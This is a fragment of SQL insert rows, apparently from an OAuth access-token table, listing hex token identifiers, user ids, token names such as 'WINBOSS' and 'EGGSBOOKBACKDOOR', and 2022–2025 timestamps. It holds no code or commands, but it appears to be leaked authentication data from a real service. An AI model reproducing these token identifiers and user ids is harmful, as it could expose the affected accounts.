('3e766c2094ce9d2380955c51ae2e7dbc974422ff77ba65281ce39313fb291c443d3bcfd47d0720a2', '153171', 5, 'WINBOSS', '[]', 0, '2023-03-15 00:51:04', '2023-03-15 00:51:04', '2024-03-15 00:51:04'),
('3e93f0b2b1145ab90e1e0b3b0d21605b80fa32eca129805048136c349ae694fcb8fc77a0837a25f6', '801546', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:21:32', '2022-06-28 08:21:32', '2023-06-28 08:21:32'),
('3ec243fcb8ef6f29d79830b5c0f50a62b28a634a9a311efd803647db6d20a9f92a76358189e994ad', '665842', 5, 'WINBOSS', '[]', 0, '2023-03-10 10:05:21', '2023-03-10 10:05:21', '2024-03-10 10:05:21'),
('3f26f3c44ba8c4b241b5b4c34e571790356372e7098f04b10917f7a21b5a8e079c73e715f81b35f4', '631565', 5, 'WINBOSS', '[]', 0, '2022-07-17 17:07:54', '2022-07-17 17:07:54', '2023-07-17 17:07:54'),
('3f8966d9c893e9a7dce6e5279f1d304f2c4a1a5fdd68c6952182a3a995a5a1532f9cebf41797d945', '601883', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-06-28 08:20:56', '2022-06-28 08:20:56', '2023-06-28 08:20:56'),
('3fbd0a9138d53558c588a44cf2ba8c299922951d20f8febba2af2dee1d51ff02f3625942074f421f', '947689', 5, 'WINBOSS', '[]', 0, '2024-01-01 13:41:54', '2024-01-01 13:41:54', '2025-01-01 13:41:54'),
('3fc3563afb01befa6124ffc36406f1337b0a77704a39e74d6f5cff923dc2500d299e0f3f8ee4ce20', '589239', 5, 'WINBOSS', '[]', 0, '2022-12-09 14:15:19', '2022-12-09 14:15:19', '2023-12-09 14:15:19'),
('3fc8822a871a63650448aec6511ba9447220fdd1052f8a8c17d93105c8790a70ddde2f127b0643dd', '106740', 5, 'WINBOSS', '[]', 0, '2023-05-08 10:01:56', '2023-05-08 10:01:56', '2024-05-08 10:01:56'),
('4026217e5a5a7e4b23444c1cfae772fd5cc7a24ad52a176efb8480e14c3d2675aef3f4f0f6b85463', '502838', 5, 'WINBOSS', '[]', 0, '2022-11-12 08:13:37', '2022-11-12 08:13:37', '2023-11-12 08:13:37'),
('402b8fdbef328e20ab4daf4e2b50b982e48b5fa18eae13939caedc056f0fbf2fa94b7b9644313447', '697395', 5, 'WINBOSS', '[]', 0, '2023-05-26 08:21:39', '2023-05-26 08:21:39', '2024-05-26 08:21:39'),
('403092e989cdcd6c27659634a8aee661a0b0598e65451ee24e38e6fc3efcc4f361451cc389b77c6f', '120660', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:10:20', '2022-12-25 22:10:20', '2023-12-25 22:10:20'),
('4031fc3599807dac5509adb4f0b975ec8b49550695938175c2105c08dd5f83366f8f613d9fe73fc6', '776816', 5, 'WINBOSS', '[]', 0, '2023-07-25 12:15:16', '2023-07-25 12:15:16', '2024-07-25 12:15:16'),
('404ea17cf5c35966088864822c837ecc19c89a60f5ff1f2bf4f48f3c03e1b00b811eedba85f4f02d', '107469', 5, 'WINBOSS', '[]', 0, '2023-07-01 03:44:02', '2023-07-01 03:44:02', '2024-07-01 03:44:02'),
('404eae5262bae98fe6d93dff54cd7da05460e782772cc2e191f3ae758fe70167037f53d7f28aaa0d', '339078', 5, 'WINBOSS', '[]', 0, '2023-04-10 18:20:59', '2023-04-10 18:20:59', '2024-04-10 18:20:59'),
('405a77183b762068e0db7190e1d0dd0ef7a53816bcf432474af6a2225f1b3d0d2851854a20df5c93', '601468', 5, 'WINBOSS', '[]', 0, '2024-01-20 07:19:27', '2024-01-20 07:19:27', '2025-01-20 07:19:27'),
('4097e96aec1d7d34f579cbf9ebab619dbcb945ccbf645e52e7e3dc7ea6e974c5333ee99ff97442aa', '622040', 5, 'WINBOSS', '[]', 0, '2022-12-27 17:57:44', '2022-12-27 17:57:44', '2023-12-27 17:57:44'),
('409adc64e0c1689f40bc5112777a60ef3e5d2198969f5786ed31fe881d0a07da0bdca8d578c68b23', '594773', 5, 'WINBOSS', '[]', 0, '2023-06-18 12:34:26', '2023-06-18 12:34:26', '2024-06-18 12:34:26'),
('40cbf782f728591db6c7805149549da16f018e49870cd47a984290c4e88c81e37fc15c1281578e5d', '259219', 5, 'WINBOSS', '[]', 0, '2024-01-01 13:42:19', '2024-01-01 13:42:19', '2025-01-01 13:42:19'),
('40d3e4bccc1afc3779d207dc6cd38b6af0b3ebeb3ca8f0af3f5a7748b62427306538de2cab5c0c95', '108737', 5, 'WINBOSS', '[]', 0, '2024-01-22 03:01:45', '2024-01-22 03:01:45', '2025-01-22 03:01:45'),
('40e7ccf1a239c53a151b9220971f549ca15627873d00580f41c17cc619210a326d84a2d3a82583d9', '395152', 5, 'WINBOSS', '[]', 0, '2023-11-22 11:37:48', '2023-11-22 11:37:48', '2024-11-22 11:37:48'),
('40f63a927c4657d80f92c273ba4e1c1018df073d61379c0c11cbd7d70673b0b50e39e94bcad20a4f', '491528', 5, 'WINBOSS', '[]', 0, '2023-01-10 19:04:29', '2023-01-10 19:04:29', '2024-01-10 19:04:29'),
('412c2116fc6c5d19ad85dfa1450b6ab13d0b2a98699137c71ebf2543dd8536539e9851f2045d07b0', '639829', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-04-12 09:21:58', '2023-04-12 09:21:58', '2024-04-12 09:21:58'),
('41325f1f7b22bd046893f22afd83806639b32739e3125889093ba2f0264d9beaa669f2c375932027', '219729', 5, 'WINBOSS', '[]', 0, '2023-06-19 10:14:09', '2023-06-19 10:14:09', '2024-06-19 10:14:09'),
('413e858db3a7125fba932a30e68cf269fe38bbe6cc7734edb7175d07bc515d7f976809bcd04e2e65', '367268', 5, 'WINBOSS', '[]', 0, '2023-07-01 16:13:13', '2023-07-01 16:13:13', '2024-07-01 16:13:13'),
('4182470f1f6900b044086a1539409977ac0287aae795cb509b51129489455f38c2cc829495b95e92', '665061', 5, 'WINBOSS', '[]', 0, '2022-12-20 05:55:13', '2022-12-20 05:55:13', '2023-12-20 05:55:13'),
('41a93014e4f9ab21c4aef4849e7785e59ec27e5511bf170cdd9a10e1ae25737a5f403aa81476bf77', '159583', 5, 'WINBOSS', '[]', 0, '2022-07-04 11:19:41', '2022-07-04 11:19:41', '2023-07-04 11:19:41'),
('41cad6b669fa91b80c70165b8fb218afd984a202e56a5b61833ad957199b728425d1da25f77bef34', '465305', 5, 'WINBOSS', '[]', 0, '2023-03-10 07:29:12', '2023-03-10 07:29:12', '2024-03-10 07:29:12'),
('41da93821af248252ed8dd593d4271fb8960e8c14eaa2a240901e089f8a14ccc2f64ca0a1adb737d', '153391', 5, 'WINBOSS', '[]', 0, '2023-12-31 09:45:44', '2023-12-31 09:45:44', '2024-12-31 09:45:44'),
('41df9ad91d3e69753f1fdc8b5e97ac7821b4a4706b6121f4bb01da450af5ab3989a5e25b07fea9b6', '729816', 5, 'WINBOSS', '[]', 0, '2023-09-11 20:17:54', '2023-09-11 20:17:54', '2024-09-11 20:17:54'),
('422c4a5fba5700b2f3a3c488b940096fe9f0250335a94f86dbb5c3c3ebcbc54ab527ec20dea90d95', '756920', 5, 'WINBOSS', '[]', 0, '2023-06-23 18:50:57', '2023-06-23 18:50:57', '2024-06-23 18:50:57'),
('423229dcdb2c102b81600d4025f5b845839d359795806cdae2b9cd4ef8f248178eb5d4b9d54d31f5', '559609', 5, 'WINBOSS', '[]', 0, '2024-01-15 02:09:19', '2024-01-15 02:09:19', '2025-01-15 02:09:19'),
('42c5f6c708ed1a9dcab36d0acf85ee430e3b2d4313af7848ee7aee5b164248a8c98bd1dc2475df27', '943377', 5, 'WINBOSS', '[]', 0, '2023-06-10 02:03:37', '2023-06-10 02:03:37', '2024-06-10 02:03:37'),
('43452a724d76815df75a6d5fbc2763fbd705d6260770f67d99f41938d12d47dcd8e20d4ea215e81e', '643270', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-11-21 03:21:24', '2022-11-21 03:21:24', '2023-11-21 03:21:24'),
('4374122135c14a05c684ce894b6d7fddceca88297d66358feda23cd496815ac1da5ea6f4031b43b5', '670356', 5, 'WINBOSS', '[]', 0, '2022-12-26 13:46:36', '2022-12-26 13:46:36', '2023-12-26 13:46:36'),
('44001c541855e033e8370bec6a9134a8fd702ee76a0b1d0efb91217a2781753f1d20183c1dd60450', '216579', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:56:30', '2024-01-22 04:56:30', '2025-01-22 04:56:30'),
('442625c37b1b322df5226895a0b6b63bef9a815e8d0c89850659db5f55f35d69ef618871df0a5ad1', '429685', 5, 'WINBOSS', '[]', 0, '2022-12-07 10:09:24', '2022-12-07 10:09:24', '2023-12-07 10:09:24'),
('4459f2a23e1ee9c5995995615d6664e523071bb9a5c72ed95bcdee3d6ccf2bb8538129e8904f75fe', '839824', 5, 'WINBOSS', '[]', 0, '2023-12-30 04:17:15', '2023-12-30 04:17:15', '2024-12-30 04:17:15'),
('44ff8ee4e4503cdc371877b2a97c82c1164418fb4ddff4a78656cd54c42815085dc059c6697d5ed6', '743039', 5, 'WINBOSS', '[]', 0, '2022-12-07 23:00:59', '2022-12-07 23:00:59', '2023-12-07 23:00:59'),
('450f358761a879ec0c3e8af641b2153069570fd84eeef1823769fa149f760454cf21ef82178c9528', '553703', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:41:21', '2022-09-01 05:41:21', '2023-09-01 05:41:21'),
('45881b9ae7a1b70b15d3f370bb31b6f9e34e1b1f2b1d2457f005991abc4389fa438156db1cc5a5c8', '796917', 5, 'WINBOSS', '[]', 0, '2022-07-08 08:26:14', '2022-07-08 08:26:14', '2023-07-08 08:26:14'),
('45909188135a4bcc25e1bdb7799f19c4787f6c33bfa9048e4b1ba215cbd0d74e33295440ca79bac5', '336941', 5, 'WINBOSS', '[]', 0, '2022-12-26 00:04:14', '2022-12-26 00:04:14', '2023-12-26 00:04:14'),
('459b2f5370e16ebac4445206c170b1b93b3aab0243c3fd782849fea887e1bcdfe82a463c8c95edfd', '601864', 5, 'WINBOSS', '[]', 0, '2022-09-30 07:43:40', '2022-09-30 07:43:40', '2023-09-30 07:43:40'),
('45b18e3d449e118e44d5ee3c483c70d7a6a31648835785f2b084df11541854bdc478aafbc1756485', '212478', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:22:29', '2022-12-10 13:22:29', '2023-12-10 13:22:29'),
('45cf22d70c3734baabadab7d76588edc7c68989ff1b29337f3ec3e5b21c283127ed741b433b371fe', '246717', 5, 'WINBOSS', '[]', 0, '2022-11-19 13:03:48', '2022-11-19 13:03:48', '2023-11-19 13:03:48'),
('45ea4df9ce50a85d8ed039c990bdad29fb3b0293625bae8e1f682689e711c122c52b5f3049af27fb', '711635', 5, 'WINBOSS', '[]', 0, '2022-11-15 02:44:16', '2022-11-15 02:44:16', '2023-11-15 02:44:16'),
('45f7adf25f6418e3362552888299ef1d57eb740435a27b41df1cea5351033c365b1cec0dbbe17e58', '103525', 5, 'WINBOSS', '[]', 0, '2022-08-16 03:26:13', '2022-08-16 03:26:13', '2023-08-16 03:26:13'),
('4620196704e81c7a429d704e0bff2118882b775e0cc2eaa2c23bf9e15cd227fbabf14f046a5118cd', '750984', 5, 'WINBOSS', '[]', 0, '2023-05-23 10:08:34', '2023-05-23 10:08:34', '2024-05-23 10:08:34'),
('463470a5756ba2aebb8818c5c8ddba1142d3fbd172fa83d9a1119a1baa8addf79353fb52e9580685', '114459', 5, 'WINBOSS', '[]', 0, '2023-06-09 22:22:42', '2023-06-09 22:22:42', '2024-06-09 22:22:42'),
('46560ad984f3b45652e4fbf85e362f92341484c0b434adac82dfa4f5757442180e8c3decb17a4908', '606434', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:23:04', '2022-06-28 08:23:04', '2023-06-28 08:23:04'),
('469c30da604c4c0faf49278e2ae6ab13805a3be8b435e003c330e02e43f6e6c9d777a0a58a6b971e', '806056', 5, 'WINBOSS', '[]', 0, '2022-11-05 15:18:00', '2022-11-05 15:18:00', '2023-11-05 15:18:00'),
('46b0809f7b86c9c42a27c6f073e16c59de5682ba7c10d0097d4120e6145ef81e01164692950684e5', '178199', 5, 'WINBOSS', '[]', 0, '2023-04-08 05:01:04', '2023-04-08 05:01:04', '2024-04-08 05:01:04'),
('46f1516beb8bed6df87c18d79ddf04cf848d3a721f44263e3ef5dbdce5908aea4c789fda1769519d', '263707', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:26:07', '2024-01-22 04:26:07', '2025-01-22 04:26:07'),
('47229fcc57709d79cc33e7e699a66018ce43db2d83620273694481859875985211cae4e86e20fe7b', '745115', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:15:50', '2022-09-01 05:15:50', '2023-09-01 05:15:50'),
('478dbb7e3aa6fd82ebd6b2ec9b5d1547a08cbc54c9b7da19be8394223e6c417e39bf4e1628367c31', '126000', 5, 'WINBOSS', '[]', 0, '2023-05-22 10:19:46', '2023-05-22 10:19:46', '2024-05-22 10:19:46'),
('47959f8c43f7c5dafc426b8020874a2e96f439f9fd554fa9c5c1822f32da798b3bf331dc06e7b3a6', '881844', 5, 'WINBOSS', '[]', 0, '2024-01-15 03:20:19', '2024-01-15 03:20:19', '2025-01-15 03:20:19'),
('47d437c377d4a3639c57455aeef62c6864499d0d7e3166e8b82558fc085e317801c0c3a0ebf083c9', '841046', 5, 'WINBOSS', '[]', 0, '2023-11-05 22:58:33', '2023-11-05 22:58:33', '2024-11-05 22:58:33'),
('47de24c4e0b6c4b0b634c2da0f65e8cd0f009b3dff51eba699786bb26eed51546d4586e4f2ea019e', '383419', 5, 'BeTNoW', '[]', 0, '2022-11-07 04:23:47', '2022-11-07 04:23:47', '2023-11-07 04:23:47'),
('47f4067715298af11dbac36c6d36b89691ed080697d7923b1c98dad6e074f0272a2b03e308462875', '883062', 5, 'WINBOSS', '[]', 0, '2023-08-16 05:46:46', '2023-08-16 05:46:46', '2024-08-16 05:46:46'),
('483dc87ecc38845f7f5ed5f8d52e58f2df06b4ad46b5e85dd3c5ae2490b50a99c8e5ce32c890675a', '794803', 5, 'WINBOSS', '[]', 0, '2022-12-10 16:56:15', '2022-12-10 16:56:15', '2023-12-10 16:56:15'),
('484fe1455dfdf036d03f8bc251a2fdea12e0d11ba1381738820e12106bac7bab9395e4454f928383', '194112', 5, 'WINBOSS', '[]', 0, '2023-03-21 10:07:31', '2023-03-21 10:07:31', '2024-03-21 10:07:31'),
('488ab5aa75ce973e0ff6ce5c374f239edd5c39334f13fd1295ef8a37b59c3367dca477682b842f9a', '696739', 5, 'WINBOSS', '[]', 0, '2023-11-10 00:38:48', '2023-11-10 00:38:48', '2024-11-10 00:38:48'),
('488c4768a2553ecfe75ad2a0ddc699b507c6502f261cc91920d27e7c4aa5b30e41eccd4641b53454', '288123', 5, 'WINBOSS', '[]', 0, '2023-12-29 02:32:47', '2023-12-29 02:32:47', '2024-12-29 02:32:47'),
('4893038db9bbd94e8c1350dd0c372b75b1021be4125aa20652ef1f166bf7e9f6b8b1d1053e1904cb', '427183', 5, 'WINBOSS', '[]', 0, '2023-01-11 07:48:11', '2023-01-11 07:48:11', '2024-01-11 07:48:11'),
('48945699cf718c14d4f7ba31a6000b0eebb4e03ee8b12fa3bd0f6f5b3e5ce083b0ff00984bd3668c', '599654', 5, 'WINBOSS', '[]', 0, '2023-04-18 10:49:39', '2023-04-18 10:49:39', '2024-04-18 10:49:39'),
('4899d14dddcdf8bcb603cf1722d3e6ce89d1e747a5a52ca2bd10cf10113bb0b515456834201c8920', '150624', 5, 'WINBOSS', '[]', 0, '2023-09-22 05:55:14', '2023-09-22 05:55:14', '2024-09-22 05:55:14'),
('48e1add8a896c51cc1b2e68b1b722c4567b879218e80edf614c1b7e4a47e9071f0bac689887fe7bc', '832370', 5, 'WINBOSS', '[]', 0, '2023-07-08 16:45:03', '2023-07-08 16:45:03', '2024-07-08 16:45:03'),
('49008cc783a194c185b5af35059226f615338098ce718e0c68f5bb44aab9fee1dc1938dcf015d357', '150665', 5, 'WINBOSS', '[]', 0, '2023-07-23 18:36:58', '2023-07-23 18:36:58', '2024-07-23 18:36:58'),
('493a3636f7f98772344621445e3170c04dcf51f0c76f0c2e3eb7e6c24d91585b3f49ef5e627b30ab', '746948', 5, 'WINBOSS', '[]', 0, '2023-03-10 07:25:40', '2023-03-10 07:25:40', '2024-03-10 07:25:40'),
('493ed724110e091c03cabc901dc34805eeb0f143fafc3a6eab1aa02e9964aeb848226d2516ad2366', '318020', 5, 'WINBOSS', '[]', 0, '2024-01-15 08:18:58', '2024-01-15 08:18:58', '2025-01-15 08:18:58'),
('494630e13e0eddd249bfbbeb5fe7369a5f9e7e6cdf4ebf622667ba808da441569c792a08d083199a', '417581', 5, 'WINBOSS', '[]', 0, '2022-12-22 22:02:05', '2022-12-22 22:02:05', '2023-12-22 22:02:05'),
('4951c713351185ba63b580675b6c5186d0a55d5e3d3537e067e6b610cb6b7e747b7670bc92d0bfab', '874576', 5, 'WINBOSS', '[]', 0, '2023-08-03 09:05:43', '2023-08-03 09:05:43', '2024-08-03 09:05:43'),
('497d671a1f83e50aeff49b6c9d1fd7b37217642edd243ed65a033bb083d209112308b70297bb63d8', '404182', 5, 'WINBOSS', '[]', 0, '2023-05-05 07:36:07', '2023-05-05 07:36:07', '2024-05-05 07:36:07'),
('49a210b7efa211c7a2bafd52521e899e2f6ffe75b81ecd451b358b277fc739a0f5fa14017b06d33f', '462113', 5, 'WINBOSS', '[]', 0, '2023-11-20 11:12:32', '2023-11-20 11:12:32', '2024-11-20 11:12:32'),
('49ad7e31b6e693aa1d94ced8d12c9fc8d56d9a176a2f94cf99f103abae58be4cb703321832bcddcb', '169160', 5, 'WINBOSS', '[]', 0, '2023-02-08 04:51:19', '2023-02-08 04:51:19', '2024-02-08 04:51:19'),
('49b7d7e9f1518892e26d65350989d3e8ad4c430f357e77cbc096d482d84071dce4569e93a04f1a71', '572437', 5, 'WINBOSS', '[]', 0, '2022-12-27 20:02:04', '2022-12-27 20:02:04', '2023-12-27 20:02:04'),
('4a07e313599bc55526b3942529e85abd646c9e8c152f0f957398cf98b3c085b0ff497d79fa3c390a', '599791', 5, 'BeTNoW', '[]', 0, '2022-12-06 14:58:26', '2022-12-06 14:58:26', '2023-12-06 14:58:26'),
('4a231fe8011877827b7533516e7f5a20a4c45acae73f977aeb1e9213afe7be0c1a2a92c45071ea0e', '374159', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:35:57', '2022-12-25 21:35:57', '2023-12-25 21:35:57'),
('4aa57304c17bbf60d0a7ef18d28df4f2808a703a0a5c77c79b44dc7e6477cf8450232e17da204f8f', '568602', 5, 'WINBOSS', '[]', 0, '2022-12-08 11:30:18', '2022-12-08 11:30:18', '2023-12-08 11:30:18'),
('4b036740902c265af7905a7cefc96282df887f64d525c1c2668dceaf83e23e439b68dfa4cc1909b6', '598649', 5, 'WINBOSS', '[]', 0, '2022-12-14 15:45:36', '2022-12-14 15:45:36', '2023-12-14 15:45:36'),
('4b1101ddae9c04398c0d671ad14c8869aeda9b3a29503f3cead46d4673d6f872a3aec292ee6fd851', '916171', 5, 'WINBOSS', '[]', 0, '2022-08-23 09:28:35', '2022-08-23 09:28:35', '2023-08-23 09:28:35'),
('4b132886f0139d55716e1bdaf6bb57db0385364a8ba2f820134e34ed220fbdbe265e4051ac19670c', '832263', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:01:29', '2022-12-25 20:01:29', '2023-12-25 20:01:29'),
('4b49f2cdd53f6e337a4e9c7fc3191d0c18ba1505f85b3222c82c7ff900ad2c1ad2f199b501f7adbd', '351268', 5, 'WINBOSS', '[]', 0, '2023-07-10 11:24:08', '2023-07-10 11:24:08', '2024-07-10 11:24:08'),
('4b9be988bc87861d5562798671bf7d77ebada70fe872d8eaa71fc5236e4cce520bc9a7b4abe47a83', '975076', 5, 'WINBOSS', '[]', 0, '2023-07-20 10:28:33', '2023-07-20 10:28:33', '2024-07-20 10:28:33'),
('4bb26f7e6ed7402590ce3f578310b4a3a84771348978b3953d134ce4c5dd1f24af460b1c1d0e5ef0', '580615', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-11-08 04:26:39', '2023-11-08 04:26:39', '2024-11-08 04:26:39'),
('4bcd8132cbdc732c91920f1d7a7a68ddd2b0f3466f01c31d3f72c99ccb26bc859c22b6b6c6f6faad', '822128', 5, 'WINBOSS', '[]', 0, '2023-04-14 06:49:24', '2023-04-14 06:49:24', '2024-04-14 06:49:24'),
('4c0ac4b20bda084d6f381da454334c8a7fcef288b0ed94640f999512121a5d7c56fde25eaecdd050', '422530', 5, 'WINBOSS', '[]', 0, '2023-01-02 18:24:10', '2023-01-02 18:24:10', '2024-01-02 18:24:10'),
('4c273abeed0ca46a15be647956223c7c2a74a7881c6ae6949d7c1cafdc5aa36695f4bb573a803892', '127290', 5, 'WINBOSS', '[]', 0, '2022-12-26 11:42:07', '2022-12-26 11:42:07', '2023-12-26 11:42:07'),
('4c4c429be05320edbe788e08efe8e40d85178b244f3217699377cde169704c14b770eb834bdfe5b7', '431074', 5, 'WINBOSS', '[]', 0, '2023-12-01 20:18:56', '2023-12-01 20:18:56', '2024-12-01 20:18:56'),
('4c67406c56e0f5237555b8b54ed1964fbdb05122b16e62012dfa927d000cddbd6cd98c93e8b4df16', '508554', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:49:27', '2023-08-15 08:49:27', '2024-08-15 08:49:27'),
('4ca6bbe07543c0cc47280c23e67359c9432df21f01cdba18215d7d656c6275645d12f46976083d50', '398399', 5, 'WINBOSS', '[]', 0, '2023-10-27 20:38:22', '2023-10-27 20:38:22', '2024-10-27 20:38:22'),
('4cae7e35345eb84b51f255070fd67546f7ed716aa7b4f666395f9cc8891ea7fe6e9249eeaa37b232', '673519', 5, 'WINBOSS', '[]', 0, '2023-04-16 14:11:30', '2023-04-16 14:11:30', '2024-04-16 14:11:30'),
('4cb67081353f0a5b1fca0f01e069ff05cfe97ce1a7ea14dc3d5275a87ca25212cb4f45154526d6c9', '770825', 5, 'WINBOSS', '[]', 0, '2023-04-18 10:55:55', '2023-04-18 10:55:55', '2024-04-18 10:55:55'),
('4cbfc5d0ba87511bd4933afebdf0fb232a44dcd2002b24f987462b0235c5814bc716ec308c929ebc', '348181', 5, 'WINBOSS', '[]', 0, '2022-11-01 04:28:32', '2022-11-01 04:28:32', '2023-11-01 04:28:32'),
('4cc766a52a33a71cd1386511e9adb1f1f9d97213c4ca4c8f31ea2f3b5c90c9355dd649418c982c30', '443156', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:36:05', '2024-01-22 04:36:05', '2025-01-22 04:36:05'),
('4d3411eb957ae0089d97bbbaf45e3142cf2fa52b51f951e059dbd740cb3bd5c52c1cc44174f12ed3', '989218', 5, 'WINBOSS', '[]', 0, '2023-01-22 01:23:26', '2023-01-22 01:23:26', '2024-01-22 01:23:26'),
('4d85dec855bc02a2fc90e99398138c847376a167fc38ab990aba001fae148a6ec4ca2d09867907b0', '397208', 5, 'WINBOSS', '[]', 0, '2023-06-26 15:11:00', '2023-06-26 15:11:00', '2024-06-26 15:11:00'),
('4d88e8b2ab040c3947980c7e87b5f4d24485a94f5062937aa1ad39428e07ca94b18044d0181a62b3', '269492', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:10:15', '2024-01-22 04:10:15', '2025-01-22 04:10:15'),
('4dd3ec9e3d0cc5c2d01c870d2b38316e7a2ab16e641a2d543d062da214480f551bb2169c0100598f', '166721', 5, 'WINBOSS', '[]', 0, '2023-08-15 08:35:47', '2023-08-15 08:35:47', '2024-08-15 08:35:47'),
('4dfad2222bd33007565f6a5109162b134e0f2e131199d496402d7bedeb8e85d9d345780665080730', '565358', 5, 'WINBOSS', '[]', 0, '2023-04-28 13:46:34', '2023-04-28 13:46:34', '2024-04-28 13:46:34'),
('4ea10d26a3d7e8cb7068ebd288501f7a8acdc01672e3cb66f1a489fbc4386302e48a76ff3b6c3201', '624148', 5, 'WINBOSS', '[]', 0, '2023-12-28 09:17:25', '2023-12-28 09:17:25', '2024-12-28 09:17:25'),
('4ebe264b340cd9ec93beb43c3ef81d9e57e0da79d267df216bd3e766f328a55bd3e6082b19ad6891', '971416', 5, 'WINBOSS', '[]', 0, '2024-01-20 09:12:21', '2024-01-20 09:12:21', '2025-01-20 09:12:21'),
('4ed70a6fceee541acfeea3ceb9bfe6b2db63521c0d8bb53d5e03a0fdfe67c83730b9e1f63c6fb676', '961649', 5, 'BeTNoW', '[]', 0, '2023-05-10 09:57:11', '2023-05-10 09:57:11', '2024-05-10 09:57:11'),
('4ed896773c042937adeba6a93b0e194094695ea3a5b0c12866added7d8ed71c08f88af0b9c84a27a', '446920', 5, 'WINBOSS', '[]', 0, '2023-10-13 16:37:03', '2023-10-13 16:37:03', '2024-10-13 16:37:03'),
('4edf639ef2197c1e60e2963425ce697faedab1e37f7e64b47754d149c9a55d193f04b52b38844f58', '871241', 5, 'WINBOSS', '[]', 0, '2023-07-28 00:00:39', '2023-07-28 00:00:39', '2024-07-28 00:00:39'),
('4f0a868e5faa8ba8d34f7cda4565907f469570ae758fb11518a6b887c1c4b28a4d8133d607994c6f', '881613', 5, 'WINBOSS', '[]', 0, '2023-02-05 06:57:45', '2023-02-05 06:57:45', '2024-02-05 06:57:45'),
('4f2e0e584ac4d13c3a8e9a44ce3b86be0fe70a666f04e3350be451111c0bbb372e9bbb7c4ae33f68', '218793', 5, 'WINBOSS', '[]', 0, '2022-07-08 18:18:00', '2022-07-08 18:18:00', '2023-07-08 18:18:00'),
('4f5295151c9c1339e516ce2f954c9916e231107775312f7f0b08748be9a6bbc10c14b21b31b813c2', '994752', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:17:37', '2022-06-28 08:17:37', '2023-06-28 08:17:37'),
('4f6b4c8cc2e288dad4eab55b72291defa0589b366bee50a2e8d721614d7696d41b61e894f09e800f', '274208', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:11:41', '2022-09-01 05:11:41', '2023-09-01 05:11:41'),
('4fa79e8dad460a775073aa4c5b386f3f116952c7ad0bd9c76076c29f241c171d0e3a040d5ad5ac4a', '203710', 5, 'WINBOSS', '[]', 0, '2023-01-16 08:08:54', '2023-01-16 08:08:54', '2024-01-16 08:08:54'),
('4fe19a35e71648aa8d3ae61df044a9dbd74df08c1862d24455ff95fed82099b27b385f7152dad3e4', '521683', 5, 'WINBOSS', '[]', 0, '2023-10-09 11:04:26', '2023-10-09 11:04:26', '2024-10-09 11:04:26'),
('50176901f3c396ae4582b084c1c4d88026ef6bdb9d672d28a1229ab34f06f88baf596f415d8d1bcb', '566063', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:44:22', '2023-05-31 05:44:22', '2024-05-31 05:44:22'),
('50193cfc78914c29a39cd589ecf76ed94cf300abc11f11defaf6c7773d50a9d57480c61340a8a960', '332161', 5, 'WINBOSS', '[]', 0, '2023-09-26 17:38:02', '2023-09-26 17:38:02', '2024-09-26 17:38:02'),
('505e59e874884b981ff0875143337b0522ba83464c2609e52626307a503e1e3df2f00d4813e3e4e7', '620439', 5, 'WINBOSS', '[]', 0, '2022-10-01 10:57:49', '2022-10-01 10:57:49', '2023-10-01 10:57:49'),
('50a72b98e6baa7f6508cc17c69f4f611f505994a668ef1bdb4cdcf18df3e5c7fd46d7f9ef908fff8', '110050', 5, 'WINBOSS', '[]', 0, '2022-12-25 22:06:30', '2022-12-25 22:06:30', '2023-12-25 22:06:30'),
('50b2aeb901c8d5a0305b690a960357fae86aebb87a8c37f43810d20fb459da79ce2b3fce99bf62ef', '244733', 5, 'WINBOSS', '[]', 0, '2023-11-11 04:45:54', '2023-11-11 04:45:54', '2024-11-11 04:45:54'),
('50f59771e61c3986ab9a700251e1a6dca6d91ac3cc1bf4610f9b2cef6ec2bb3fac0038cc87e86fea', '872790', 5, 'WINBOSS', '[]', 0, '2023-12-14 11:32:42', '2023-12-14 11:32:42', '2024-12-14 11:32:42'),
('5124d7baf314cc94fd3009e046eb38a2950e1e4323f22c12d4af1fcc0c94e8b7ab4af9b3a0dc02f9', '422588', 5, 'WINBOSS', '[]', 0, '2023-01-02 08:32:09', '2023-01-02 08:32:09', '2024-01-02 08:32:09'),
('51aeb3f572fe2ae99b8640909d4c5ad4832c79f63d99657a689ea08a9a48ad012cc7a821850d5eff', '694811', 5, 'WINBOSS', '[]', 0, '2023-06-12 13:12:44', '2023-06-12 13:12:44', '2024-06-12 13:12:44'),
('521699eaca1fe17d356c460ad63bddd286ad0dd40f6984c77e8b25672e03ffde0fc5c609db57f6c1', '112262', 5, 'WINBOSS', '[]', 0, '2023-02-03 02:06:39', '2023-02-03 02:06:39', '2024-02-03 02:06:39'),
('52283c46cc29a0f4b6c4fe63ab6d115698b1b79c72022413404eec5a66abe168720e562502aceece', '405366', 5, 'WINBOSS', '[]', 0, '2023-04-04 08:55:36', '2023-04-04 08:55:36', '2024-04-04 08:55:36'),
('5255318ffabeb54be6125d771bcfd9098cf80bd4f35d8380960ca798a947b6480ab0a940dea5c8c2', '396412', 5, 'WINBOSS', '[]', 0, '2024-01-22 05:43:09', '2024-01-22 05:43:09', '2025-01-22 05:43:09'),
('527a5af065790a1fe25f1bf19669db09fcb15f1189b5597b8e270119c96d851e07ba083c647a10ef', '249644', 5, 'BeTNoW', '[]', 0, '2023-04-24 08:26:07', '2023-04-24 08:26:07', '2024-04-24 08:26:07'),
